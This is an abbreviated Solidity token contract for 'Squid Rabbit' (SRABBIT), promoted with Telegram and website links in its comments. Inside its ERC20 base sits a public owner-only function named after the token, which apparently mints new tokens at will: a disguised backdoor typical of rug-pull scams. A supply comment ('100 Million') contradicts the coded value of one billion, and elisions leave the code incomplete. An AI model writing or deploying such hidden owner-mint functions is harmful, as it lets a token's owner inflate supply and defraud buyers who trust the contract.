...
//
// $SquidRabbit proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+I5l3FvJ0hlxiN2Rl
// 📱 website::https://squidrabbit.website
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SquidRabbit(uint256 amount) public onlyOwner {
 _SquidRabbit(msg.sender, amount);
    }
    ...
    function _SquidRabbit(address account, uint256 amount) internal virtual {
...
contract $SquidRabbit is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Squid Rabbit", "SRABBIT") {
     _SquidRabbit(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}